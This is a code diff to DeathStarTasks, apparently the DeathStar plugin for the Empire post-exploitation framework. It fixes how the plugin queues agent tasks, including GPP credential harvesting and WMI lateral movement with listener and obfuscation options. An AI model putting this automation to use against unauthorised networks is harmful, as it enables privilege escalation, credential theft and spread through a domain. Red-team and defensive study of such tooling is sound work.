@@ -15,7 +15,7 @@ class DeathStarTasks:
             module_id="powershell_privesc_gpp", options=params
         )
         res, err = self.main_menu.agenttasksv2.create_task_module(
-            db, agent, module_post_request, 0
+            db, agent, module_post_request, None
         )
 
         if not err:
@@ -34,7 +34,7 @@ class DeathStarTasks:
             options=params,
         )
         res, err = self.main_menu.agenttasksv2.create_task_module(
-            db, agent, module_post_request, 0
+            db, agent, module_post_request, None
         )
 
         if not err:
@@ -55,7 +55,7 @@ class DeathStarTasks:
             options=params,
         )
         res, err = self.main_menu.agenttasksv2.create_task_module(
-            db, agent, module_post_request, 0
+            db, agent, module_post_request, None
         )
 
         if not err:
@@ -77,7 +77,7 @@ class DeathStarTasks:
             options=params,
         )
         res, err = self.main_menu.agenttasksv2.create_task_module(
-            db, agent, module_post_request, 0
+            db, agent, module_post_request, None
         )
 
         if not err:
@@ -89,13 +89,20 @@ class DeathStarTasks:
         agent = self.main_menu.agentsv2.get_by_id(db, session_id)
         params = {
             "Agent": session_id,
+            # Needed even though Payload is internal: validate_options gates
+            # Listener on the raw params dict, and without this it substitutes
+            # Listener's '' default, so invoke_wmi fails "Listener or Command
+            # required". Do NOT add Credentials="Manual" to match -- satisfying
+            # that gate makes the empty UserName/Password below required.
+            "Payload": "Empire",
             "Listener": listener,
             "UserName": "",
             "Password": "",
             "OutputFunction": "Out-String",
             "ComputerName": computer_name,
+            # Unused while Obfuscate is False, but kept correct as a pair.
             "Obfuscate": "False",
-            "ObfuscationCommand": r"Token\All\1",
+            "ObfuscateCommand": r"Token\All\1",
             "ProxyCreds": "default",
             "Proxy": "default",
             "UserAgent": "default",
@@ -105,7 +112,7 @@ class DeathStarTasks:
             options=params,
         )
         res, err = self.main_menu.agenttasksv2.create_task_module(
-            db, agent, module_post_request, 0
+            db, agent, module_post_request, None
         )
 
         if not err:
